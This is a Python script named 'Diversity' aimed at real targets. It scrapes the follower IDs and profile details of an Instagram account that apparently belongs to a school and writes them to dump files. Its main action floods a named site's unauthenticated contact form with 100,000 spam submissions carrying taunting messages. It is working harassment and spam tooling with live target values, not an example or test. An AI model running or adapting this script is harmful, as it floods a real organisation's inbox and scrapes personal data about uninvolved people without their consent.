# Libraries
from random import sample, choice
from colorama import Fore, init
from os import system, path
from instabot import Bot
from time import sleep
import requests
import string

# Config
Targets = ['scuole_villafranca', 'https://63332ebdb5094.site123.me/versions/2/include/contactO.php']
InstagramLoginData = ['', '']
Wait = False
Action = 3

# Data
RandomCharacters = f'{string.ascii_lowercase}{string.ascii_uppercase}{string.digits}'
InstagramIds = []

# Chrome Functions
def check_status_code(code):
    if 100 <= code <= 199:
        return f'{Fore.LIGHTBLUE_EX}Informational response'
    elif 200 <= code <= 299:
        return f'{Fore.LIGHTGREEN_EX}Successful response'
    elif 300 <= code <= 399:
        return f'{Fore.YELLOW}Redirection response'
    elif 400 <= code <= 499:
        return f'{Fore.LIGHTRED_EX}Client error response'
    elif 500 <= code <= 599:
        return f'{Fore.LIGHTRED_EX}Server error response'
    else:
        return f'{Fore.LIGHTRED_EX}Unknown response'

# Instagram Functions
def get_target_followers_ids():
    StatusCounter = 0
    InstagramBot = Bot()
    InstagramBot.login(username=InstagramLoginData[0], password=InstagramLoginData[1])
    for FollowerId in InstagramBot.get_user_followers(Targets[0]):
        InstagramIds.append(FollowerId)

        print(str(StatusCounter) + ' : ' + FollowerId)
        StatusCounter += 1
    with open('output/followers_ids_dump.txt', 'w+') as DumpIds:
        DumpIds.write(str(InstagramIds))
        DumpIds.close()

def get_target_followers_info():
    FollowersInfo = ''
    StatusCounter = 0
    InstagramBot = Bot()
    InstagramBot.login(username=InstagramLoginData[0], password=InstagramLoginData[1])
    for FollowerId in InstagramIds:
        FollowerInfo = InstagramBot.get_user_info(FollowerId)
        FollowersInfo = FollowersInfo + str(FollowerInfo) + '\n'

        print(str(StatusCounter) + ' : ' + str(FollowerInfo))
        StatusCounter += 1
        sleep(0.5)
    with open('output/followers_info_dump.txt', 'wb') as DumpInfo:
        DumpInfo.write(str(FollowersInfo).encode('utf8'))
        DumpInfo.close()

# Bolisani Functions
def spam_emails_bolisani(repeat):
    SpammerMessages = [
        'Diversity beamed you!',
        'Watch out! You might want to disable notification.',
        'Uh oh, i think something wierd is happening...',
        'Oh no, your website isn\'t safe :(',
        'Next time make users login before making them send emails!',
        'See you learn something new everyday :)',
        'How did you not think about this?!?!',
        'Have fun!',
        'Please don\'t make websites if you don\'t know how they work.',
        'This is a randomly generated message composed of 60 letters!',
        'I don\'t know if you have heard about Diversity but i think they heard about you!',
        'Huh? Is something wrong?',
        'You might want to check your GMail account.'
    ]
    StatusCounter = 0
    for _ in range(repeat):
        RandomString = ''.join(sample(RandomCharacters, 10))
        Payload = {'contact_name' : RandomString, 'contact_email' : f'{RandomString}@gmail.com', 'contact_message' : f'{choice(SpammerMessages)} | {RandomString}'}
        Request = requests.post(Targets[1], data=Payload, timeout=5)
        StatusCode = Request.status_code
        Info = check_status_code(StatusCode)
        print(f'{Info} : {StatusCounter}')
        StatusCounter += 1

# Start
if __name__ == '__main__':
    init(autoreset=True)
    system('title Diversity')
    if path.exists('config'):
        system('rmdir /q /s config')
    system('cls')
    if Wait:
        sleep(10)
    print(f'''{Fore.CYAN}
    ________  .__                          .__  __          
    \______ \ |__|__  __ ___________  _____|__|/  |_ ___.__.
     |    |  \|  \  \/ // __ \_  __ \/  ___/  \   __<   |  |
     |    `   \  |\   /\  ___/|  | \/\___ \|  ||  |  \___  |
    /_______  /__| \_/  \___  >__|  /____  >__||__|  / ____|
            \/              \/           \/          \/      OHR
    ''')
    sleep(3)
    print(f'\n{Fore.CYAN}Welcome to Diversity!')
    sleep(1)
    print(f'{Fore.CYAN}Selected action: {Action}')
    sleep(1)
    if Action == 3:
        print(f'{Fore.CYAN}Target: {Targets[1]}')
    elif Action == 1 or Action == 2:
        print(f'{Fore.CYAN}Target: {Targets[0]}')
    print()
    sleep(3)
    spam_emails_bolisani(100000)
